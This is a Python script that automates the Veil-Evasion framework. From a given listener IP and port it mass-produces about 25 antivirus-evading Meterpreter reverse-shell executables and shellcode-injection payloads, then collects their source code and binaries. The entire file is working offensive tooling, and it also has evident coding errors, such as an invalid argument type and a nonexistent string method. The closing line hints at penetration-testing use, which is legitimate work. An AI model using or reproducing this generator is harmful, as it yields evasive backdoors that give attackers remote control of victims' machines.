'''
Mert Hacipoglu
Symturk
'''

#!/usr/local/bin/python
# -*- coding: utf-8 -*-

import os
import argparse

veil_path = "/root/Veil-Evasion/Veil-Evasion.py"

parser = argparse.ArgumentParser(description='Auto Veiled Payload Generator')
parser.add_argument('-LHOST',metavar='[x.x.x.x]',type=str,help='Local IP Address',required=True)
parser.add_argument('-LPORT',metavar='PORT NO', type=str,help="Port No",required=True)
parser.add_argument('-o',metavar='path/to/payloads',type=dir,help='Directory to move all payloads\nDefault is: /home/<user>/payloads/')
parser.add_argument('-d' ,metavar='T/F',type=bool,help='Display output or not')
args = parser.parse_args()
if args.d.LowerCase() is 't':
    debug=True
else:
    debug=False
payload_list={
              ("c/meterpreter/rev_http","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
              ("c/meterpreter/rev_http_service","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
              ("c/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
              ("c/meterpreter/rev_tcp_service","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
              ("cs/meterpreter/rev_http","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
              ("cs/meterpreter/rev_https","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
              ("cs/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
              ("cs/shellcode_inject/base64_substitution","compile_to_exe=Y use_arya=Y --msfpayload=windows/meterpreter/reverse_tcp"),
              ("cs/shellcode_inject/virtual","compile_to_exe=Y use_arya=Y --msfpayload=windows/meterpreter/reverse_tcp"),
              ("powershell/meterpreter/rev_http","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
              ("powershell/meterpreter/rev_https","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
              ("powershell/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
              ("python/meterpreter/rev_http","compile_to_exe=Y use_pyherion=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
              ("python/meterpreter/rev_https","compile_to_exe=Y use_pyherion=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
              ("python/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y use_pyherion=Y LHOST="+args.LHOST+" LPORT="+args.LPORT),
              ("python/shellcode_inject/aes_encrypt","compile_to_exe=Y use_pyherion=Y --msfpayload=windows/meterpreter/reverse_tcp"),
              ("python/shellcode_inject/arc_encrypt","compile_to_exe=Y use_pyherion=Y --msfpayload=windows/meterpreter/reverse_tcp"),
              ("python/shellcode_inject/base64_substitution","compile_to_exe=Y use_pyherion=Y --msfpayload=windows/meterpreter/reverse_tcp"),
              ("python/shellcode_inject/des_encrypt","compile_to_exe=Y use_pyherion=Y --msfpayload=windows/meterpreter/reverse_tcp"),
              ("python/shellcode_inject/letter_substitution","compile_to_exe=Y use_pyherion=Y --msfpayload=windows/meterpreter/reverse_tcp"),
              ("python/shellcode_inject/pidinject","compile_to_exe=Y use_pyherion=Y pid_number=1234 expire_payload=7 --msfpayload=windows/meterpreter/reverse_tcp"),
              ("ruby/meterpreter/rev_http","compile_to_exe=Y use_arya=Y --msfpayload=windows/meterpreter/reverse_tcp"),
              ("ruby/meterpreter/rev_https","compile_to_exe=Y use_arya=Y"),
              ("ruby/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y"),
              ("ruby/shellcode_inject/flat","compile_to_exe=Y use_arya=Y --msfpayload=windows/meterpreter/reverse_tcp")
              }

def CreatePayloadCommand(payload_tuple,LHOST,LPORT):
    file_name=payload_tuple[0].split("/")
    file_name=file_name[len(file_name)-3]+"_"+file_name[len(file_name)-2]+"_"+file_name[len(file_name)-1]
    return "python "+veil_path+" -p "+payload_tuple[0]+" -c "+payload_tuple[1]+" --overwrite -o "+file_name
    


#check output folder
if args.o is None:
    path=os.path.expanduser("~/payloads/")
else:
    path=args.o
#create folder
if not os.path.exists(path):
    os.makedirs(path)


print "Payloads will be created as your command...\nNothing can stop you to go for a smoke...\nSo... GO NOW!"
for payload in payload_list:
    if not debug:
        os.system(CreatePayloadCommand(payload, args.LHOST, args.LPORT)+" 2&>1 >/dev/null") #silenced mode
    else:
        os.system(CreatePayloadCommand(payload, args.LHOST, args.LPORT)+" > /dev/null") #silenced mode
    print "\t[!] Payload: "+payload[0]+" created..." 
print "All payloads created without a single error :)\nLet me move them for you into: "+path
os.system("mv /usr/share/veil-evasion/source/* "+path+".")
print "\t[!]Source Codes Moved"
os.system("mv /usr/share/veil-evasion/compiled/* "+path+".")
print "\t[!]Payloads Moved"
print "I'm done...\nHope to see you again on another test..."    